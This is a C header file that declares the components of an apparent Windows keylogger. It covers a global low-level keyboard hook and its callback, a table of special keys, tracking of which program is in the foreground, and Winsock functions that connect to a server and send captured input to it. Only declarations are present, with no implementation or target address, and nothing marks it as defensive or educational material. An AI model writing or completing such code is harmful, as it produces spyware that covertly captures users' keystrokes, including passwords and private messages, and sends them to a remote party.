#pragma once
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>
#include <winsock2.h>
#include <Windows.h>

#define PROG_NAME_LENGTH 512
#define SPECIALS_LENGTH 22

extern const int SPECIALS_CODES[SPECIALS_LENGTH];
extern const char* SPECIALS[SPECIALS_LENGTH];

extern HHOOK hook;
extern KBDLLHOOKSTRUCT kb_struct;

extern char prev_prog_name[PROG_NAME_LENGTH];
extern char curr_prog_name[PROG_NAME_LENGTH];

extern WSADATA wsa_data;
extern WORD dll_version;

extern SOCKADDR_IN addr;
extern int sizeofaddr;
extern SOCKET connection;

int find_key(int key);

int connect_to_serv();

void send_to_serv(int conn, char* msg);

int save(int key);

LRESULT __stdcall hook_callback(int n_code, WPARAM w_param, LPARAM l_param);